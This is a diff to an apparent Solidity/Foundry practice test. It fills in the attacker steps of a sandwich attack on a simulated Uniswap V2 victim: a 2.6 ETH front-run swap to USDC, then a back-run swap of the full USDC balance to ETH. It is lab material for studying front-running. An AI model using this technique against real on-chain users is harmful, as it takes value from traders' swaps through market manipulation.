@@ -53,6 +53,9 @@ contract SandwichPracticeTest is SandwichSetUp {
         _checkAttackerProfit();
     }
 
+    //attack t1:weth->usdc
+    //victim :weth->usdc
+    //attack t2:usdc->weth
     // Do not modify this test function
     function test_sandwich_attack_with_profit() public attackerModifier {
         // victim swap 1 ETH to USDC with usdcAmountOutMin
@@ -82,13 +85,30 @@ contract SandwichPracticeTest is SandwichSetUp {
     // # Practice 1: attacker sandwich attack
     function _attackerAction1() internal {
         // victim swap ETH to USDC (front-run victim)
+
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(weth);
+        path[1] = address(usdc);
+
         // implement here
+        uniswapV2Router.swapExactETHForTokens{ value: 2.6 ether }(0, path, attacker, block.timestamp);
+        vm.stopPrank();
     }
 
     // # Practice 2: attacker sandwich attack
     function _attackerAction2() internal {
         // victim swap USDC to ETH
+        vm.startPrank(attacker);
+        address[] memory path = new address[](2);
+        path[0] = address(usdc);
+        path[1] = address(weth);
+
+        usdc.approve(address(uniswapV2Router), 5 ether);
+
         // implement here
+        uniswapV2Router.swapExactTokensForETH(usdc.balanceOf(attacker), 0, path, attacker, block.timestamp);
+        vm.stopPrank();
     }
 
     // # Discussion 2: how to maximize profit ?
